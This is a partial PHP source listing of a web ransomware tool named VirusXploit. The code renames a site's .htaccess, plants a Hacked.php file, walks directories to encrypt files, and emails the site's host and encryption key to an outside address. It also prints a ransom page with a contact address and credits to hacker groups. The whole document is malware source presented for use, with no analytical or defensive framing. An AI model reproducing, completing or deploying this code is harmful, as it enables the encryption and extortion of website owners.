...
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".hacked")){
      rename(".htaccess", ".hacked");
      ...
      if(file_put_contents("Hacked.php", base64_decode(""))){
   ...
   public function shcdirs($dir,$method,$key){
        ...
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                ...
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"VirusXploit.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"vXploit.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".hacked") ){
                     switch ($method) {
                        case '1':
   ...
   public function report($key){
        $message.= "=========     VirusXploit Ransomware    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= VirusXploit (2016) Ransomware =========\n";
        $subject = "Report Ransomeware";
        $headers = "From: Ransomware <ransomeware@shor7cut.today>\r\n";
        mail("-- eggyaprilianto@gmail.com --",$subject,$message,$headers);
   }
...
<pre>
 ...
 -[ Contact : <font color="#19f211" style="text-shadow: 3px 3px 9px #19f211; font-size: 12px;">r4ns0mw4r3_xploit@vxploit.com </font>]-
</pre>
...
<form action="" method="post" style=" text-align: center;">
      ...
      <input type="submit" name="submit" class="submite" color="green" value="Done" />
</form>
<font color="#19f211" style="text-shadow: 3px 3px 9px #19f211; font-size: 12px;">Thanks To : </font>
<marquee direction="right">VirusXploit -IndoXploit - Cowok Tersakiti Team - Crack From Distance - FDCI Art - Jelangkung Squad - SENP4I - BOT Cyber Art - Indonesian Defacer</marquee>
<font>Create By H1D3T0</font>
<?php
}?>
</div>
</body>
